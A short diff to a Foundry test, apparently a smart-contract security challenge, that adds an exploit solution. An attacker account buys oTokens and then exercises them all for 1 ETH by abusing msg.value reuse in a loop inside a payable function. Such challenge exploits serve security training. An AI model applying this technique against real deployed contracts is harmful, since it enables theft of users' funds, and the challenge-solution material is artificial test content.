@@ -81,7 +81,16 @@ contract Testing is Test {
     function testChallengeExploit() public {
         vm.startPrank(attacker, attacker);
 
-        // implement solution here
+        console.log("oTokens Issuable        ", optionsContract.maxOTokensIssuable(2000e18));
+        console.log("oTokens of optionsMarket", optionsContract.balanceOf(address(optionsMarket)));
+
+        // buy 5e18 oTokens for 500e18
+        usdc.approve({spender: address(optionsMarket), amount: 500e18});
+        optionsMarket.purchase({amount: 5e18});
+
+        // exercise the oTokens and spend only 1 ETH for all because of the for loop in a payable function (msg.value in for)
+        uint256 attackerOTokens = optionsContract.balanceOf(attacker);
+        optionsContract.exercise{value: 1e18}({oTokensToExercise: attackerOTokens, vaultsToExerciseFrom: addresses});
 
         vm.stopPrank();
         validation();
